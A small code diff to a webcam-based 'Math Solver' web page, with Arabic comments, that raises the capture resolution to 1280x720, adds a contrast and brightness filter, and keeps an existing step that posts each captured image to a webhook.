@@ -39,7 +39,7 @@
   <h1>Math Solver</h1>
   <img id="math-image" src="" alt="Math Equation">
   <div id="math-equation"></div>
-  <video id="video" width="400" height="300" autoplay></video>
+  <video id="video" width="1280" height="720" autoplay></video>
 
   <script>
     var imageCounter = 1;
@@ -51,12 +51,16 @@
     function captureImage() {
       var video = document.querySelector('video');
       var canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.width = 1280; // ضبط الدقة إلى 1280
+      canvas.height = 720; // ضبط الارتفاع إلى 720
+      var ctx = canvas.getContext('2d');
+
+      // تحسين التباين والإضاءة
+      ctx.filter = 'contrast(1.2) brightness(1.1)';
+      ctx.drawImage(video, 0, 0);
       
-      // تحديث الصورة
-      canvas.toBlob(function (blob) {
+      // تحويل الصورة إلى Blob بأعلى جودة
+      canvas.toBlob(function(blob) {
         document.getElementById('math-image').src = URL.createObjectURL(blob);
 
         // إرسال الصورة إلى Webhook
@@ -67,6 +71,7 @@
         xhr.send(formData);
       }, 'image/jpeg', 1.0);
 
+      // تحديث النص أسفل الصورة
       var equation = 'Equation ' + imageCounter++;
       document.getElementById('math-equation').innerHTML = equation;
     }
